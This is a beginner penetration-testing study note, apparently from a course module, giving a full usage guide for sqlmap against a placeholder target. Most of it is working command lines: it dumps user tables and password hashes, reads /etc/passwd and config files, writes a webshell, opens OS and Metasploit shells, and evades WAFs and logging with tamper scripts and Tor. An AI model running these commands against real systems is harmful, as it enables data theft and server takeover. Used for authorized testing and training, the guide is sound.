---
tags: [vapt, sqli, beginner, tools]
difficulty: beginner
module: "06 - SQL Injection"
topic: "06.21 sqlmap — Full Usage Guide"
---

# 06.21 — sqlmap Full Usage Guide

## What is sqlmap?

sqlmap is an open-source SQL injection automation tool. It automatically detects and exploits SQL injection vulnerabilities, enumerates databases, extracts data, and can escalate to OS-level access via FILE functions and xp_cmdshell.

```
SQLMAP CAPABILITIES:
  ✓ Detect SQLi in GET/POST/cookies/headers
  ✓ All injection techniques: UNION, error, boolean, time, OOB
  ✓ All databases: MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.
  ✓ Dump entire databases
  ✓ Read/write files via SQLi
  ✓ Execute OS commands (with privileges)
  ✓ WAF bypass via tamper scripts

WARNING:
  sqlmap can be noisy — it sends many requests
  Always confirm you have authorization before using sqlmap
  Some tamper scripts may cause unintended side effects on the target
```

---

## Installation

```bash
# INSTALL:
apt install sqlmap
# OR latest from git:
git clone https://github.com/sqlmapproject/sqlmap.git
python3 sqlmap/sqlmap.py --version

# VERIFY:
sqlmap --version
```

---

## Basic Usage

```bash
# SIMPLEST — GET PARAMETER:
sqlmap -u "https://target.com/product?id=1"

# TEST ALL PARAMETERS:
sqlmap -u "https://target.com/search?term=test&category=books"

# SPECIFIC PARAMETER:
sqlmap -u "https://target.com/search?term=test&category=books" -p term

# POST BODY:
sqlmap -u "https://target.com/login" --data="username=admin&password=x"

# JSON POST:
sqlmap -u "https://target.com/api/login" \
  --data='{"username":"admin","password":"x"}' \
  -H "Content-Type: application/json"

# FROM BURP CAPTURED REQUEST (BEST METHOD):
# 1. In Burp: right-click request → "Copy to file" → save as request.txt
sqlmap -r request.txt

# SPECIFIC PARAMETER IN SAVED REQUEST:
sqlmap -r request.txt -p username
```

---

## Target Specification

```bash
# SINGLE URL:
sqlmap -u "https://target.com/product?id=1"

# MULTIPLE URLS FROM FILE:
sqlmap -m urls.txt

# CRAWL TARGET AUTOMATICALLY:
sqlmap -u "https://target.com/" --crawl=3  # crawl 3 levels deep

# WITH CUSTOM HEADERS:
sqlmap -u "https://target.com/" \
  -H "X-Custom-Header: value" \
  -H "Authorization: Bearer TOKEN"

# WITH COOKIES:
sqlmap -u "https://target.com/profile" \
  --cookie="session=ABC123; other=value"
# OR:
sqlmap -u "https://target.com/profile" \
  -H "Cookie: session=ABC123"

# INJECT IN COOKIE:
sqlmap -u "https://target.com/" --cookie="session=*" -p session
# * marks the injection point!

# INJECT IN HEADER:
sqlmap -u "https://target.com/" --headers="X-Forwarded-For: *"

# WITH AUTHENTICATION (HTTP Basic Auth):
sqlmap -u "https://target.com/" --auth-type=basic --auth-cred="user:pass"
```

---

## Detection and Injection Options

```bash
# INJECTION TECHNIQUES:
# B = Boolean-based blind
# E = Error-based
# U = UNION query
# S = Stacked queries
# T = Time-based blind
# Q = Inline queries (subqueries)

sqlmap -u "https://target.com/?id=1" --technique=BEUST  # all techniques
sqlmap -u "https://target.com/?id=1" --technique=U      # UNION only
sqlmap -u "https://target.com/?id=1" --technique=T      # time-based only
sqlmap -u "https://target.com/?id=1" --technique=BE     # boolean + error

# RISK AND LEVEL:
# Level 1-5: number of tests per parameter (default 1)
# Risk 0-3: risk of tests (default 1, higher = potentially destructive)
sqlmap -u "https://target.com/?id=1" --level=5 --risk=3

# LEVEL 5 TESTS: all parameters including User-Agent, Referer, Host, Cookie
# RISK 3 TESTS: OR-based tests (may UPDATE/DELETE data!)

# DATABASE DETECTION:
sqlmap -u "https://target.com/?id=1" --dbms=mysql
sqlmap -u "https://target.com/?id=1" --dbms=postgresql
sqlmap -u "https://target.com/?id=1" --dbms=mssql

# OS DETECTION:
sqlmap -u "https://target.com/?id=1" --os=linux
sqlmap -u "https://target.com/?id=1" --os=windows

# CUSTOM STRING (for TRUE detection):
sqlmap -u "https://target.com/?id=1" --string="welcome"   # string present on TRUE

# CUSTOM NOT-STRING (for FALSE detection):
sqlmap -u "https://target.com/?id=1" --not-string="error"  # present on FALSE

# CUSTOM REGEX:
sqlmap -u "https://target.com/?id=1" --regexp="Product: [A-Za-z]+"
```

---

## Data Extraction

```bash
# LIST ALL DATABASES:
sqlmap -u "https://target.com/?id=1" --dbs

# LIST TABLES IN DATABASE:
sqlmap -u "https://target.com/?id=1" -D myapp --tables

# LIST COLUMNS IN TABLE:
sqlmap -u "https://target.com/?id=1" -D myapp -T users --columns

# DUMP SPECIFIC TABLE:
sqlmap -u "https://target.com/?id=1" -D myapp -T users --dump

# DUMP SPECIFIC COLUMNS:
sqlmap -u "https://target.com/?id=1" -D myapp -T users -C "username,password" --dump

# DUMP ENTIRE DATABASE:
sqlmap -u "https://target.com/?id=1" -D myapp --dump-all

# DUMP ALL DATABASES:
sqlmap -u "https://target.com/?id=1" --dump-all

# DUMP WITH LIMIT (avoid huge dumps):
sqlmap -u "https://target.com/?id=1" -D myapp -T users --dump --start=1 --stop=10

# CURRENT USER/DATABASE/HOSTNAME:
sqlmap -u "https://target.com/?id=1" --current-user
sqlmap -u "https://target.com/?id=1" --current-db
sqlmap -u "https://target.com/?id=1" --hostname

# ALL USERS:
sqlmap -u "https://target.com/?id=1" --users

# USER PASSWORDS (hashes):
sqlmap -u "https://target.com/?id=1" --passwords
# sqlmap automatically tries to crack simple hashes!

# USER PRIVILEGES:
sqlmap -u "https://target.com/?id=1" --privileges
```

---

## File Operations

```bash
# READ FILE (requires FILE privilege):
sqlmap -u "https://target.com/?id=1" --file-read="/etc/passwd"
sqlmap -u "https://target.com/?id=1" --file-read="/var/www/html/config.php"

# WRITE FILE (requires OUTFILE privilege + secure_file_priv=''):
sqlmap -u "https://target.com/?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"

# CREATE WEBSHELL AUTOMATICALLY:
sqlmap -u "https://target.com/?id=1" --os-shell
# → sqlmap tries to upload a webshell and give you interactive shell!
```

---

## OS Command Execution

```bash
# INTERACTIVE OS SHELL (requires xp_cmdshell or webshell):
sqlmap -u "https://target.com/?id=1" --os-shell

# OS SHELL VIA DBA (MSSQL xp_cmdshell):
sqlmap -u "https://target.com/?id=1" --os-pwn
# → Metasploit shell!

# EXECUTE SINGLE COMMAND:
sqlmap -u "https://target.com/?id=1" --os-cmd="whoami"

# METERPRETER SESSION (MSSQL with sysadmin):
sqlmap -u "https://target.com/?id=1" --os-pwn --msf-path=/path/to/metasploit
```

---

## WAF Bypass and Evasion

```bash
# RANDOM USER AGENT:
sqlmap -u "https://target.com/?id=1" --random-agent

# DELAY BETWEEN REQUESTS:
sqlmap -u "https://target.com/?id=1" --delay=1
sqlmap -u "https://target.com/?id=1" --delay=2  # 2 seconds between requests

# RATE LIMIT:
sqlmap -u "https://target.com/?id=1" --max-rate=10  # max 10 requests/second

# TIMEOUT:
sqlmap -u "https://target.com/?id=1" --timeout=30

# PROXY:
sqlmap -u "https://target.com/?id=1" --proxy="http://127.0.0.1:8080"  # Burp!
sqlmap -u "https://target.com/?id=1" --proxy="socks5://127.0.0.1:1080"  # SOCKS5

# TAMPER SCRIPTS:
sqlmap -u "https://target.com/?id=1" --tamper=space2comment
sqlmap -u "https://target.com/?id=1" --tamper=between
sqlmap -u "https://target.com/?id=1" --tamper=randomcase
sqlmap -u "https://target.com/?id=1" --tamper=charunicodeencode

# COMBINE TAMPERS (comma-separated):
sqlmap -u "https://target.com/?id=1" \
  --tamper=space2comment,between,randomcase \
  --random-agent \
  --delay=2

# IDENTIFY WAF FIRST:
sqlmap -u "https://target.com/?id=1" --identify-waf

# TOR NETWORK (anonymization):
sqlmap -u "https://target.com/?id=1" --tor --tor-type=SOCKS5 --tor-port=9050
```

---

## Output and Verbosity

```bash
# VERBOSITY LEVELS (0-6):
sqlmap -u "https://target.com/?id=1" -v 0  # silent
sqlmap -u "https://target.com/?id=1" -v 1  # default
sqlmap -u "https://target.com/?id=1" -v 2  # show HTTP requests
sqlmap -u "https://target.com/?id=1" -v 3  # show injection payloads
sqlmap -u "https://target.com/?id=1" -v 6  # everything!

# OUTPUT DIRECTORY:
sqlmap -u "https://target.com/?id=1" --output-dir="/tmp/sqlmap-output"

# RESULT FILES:
# ~/.local/share/sqlmap/output/target.com/
# session.sqlite → sqlmap session (resume with --resume!)
# dump/ → extracted data as CSV files

# RESUME PREVIOUS SESSION:
sqlmap -u "https://target.com/?id=1" --resume

# BATCH MODE (no user interaction - say yes to all prompts):
sqlmap -u "https://target.com/?id=1" --batch --dbs
# Critical: --batch automatically accepts defaults (including potentially destructive ones)
# Use with caution!

# FLUSH SESSION (start fresh):
sqlmap -u "https://target.com/?id=1" --flush-session
```

---

## Full VAPT Workflow with sqlmap

```bash
# STEP 1: DETECT INJECTION (with Burp proxy for visibility):
sqlmap -r burp-request.txt \
  --proxy="http://127.0.0.1:8080" \
  -v 3

# STEP 2: CONFIRM AND GET DB INFO:
sqlmap -r burp-request.txt \
  --current-db --current-user --hostname \
  --batch

# STEP 3: LIST TABLES:
sqlmap -r burp-request.txt \
  -D myapp --tables \
  --batch

# STEP 4: DUMP SENSITIVE TABLES:
sqlmap -r burp-request.txt \
  -D myapp -T users -C "username,password,email" \
  --dump --batch

# STEP 5: CHECK PRIVILEGES:
sqlmap -r burp-request.txt --privileges --batch

# STEP 6: IF DBA/FILE PRIVILEGE:
sqlmap -r burp-request.txt --file-read="/etc/passwd"
sqlmap -r burp-request.txt --os-shell  # get interactive shell!
```

---

## Related Notes
- [[01 - What is SQL Injection]] — SQLi concepts
- [[14 - SQLi WAF Bypass Techniques]] — manual WAF bypass
- [[22 - Manual SQLi Testing Methodology]] — when sqlmap isn't enough
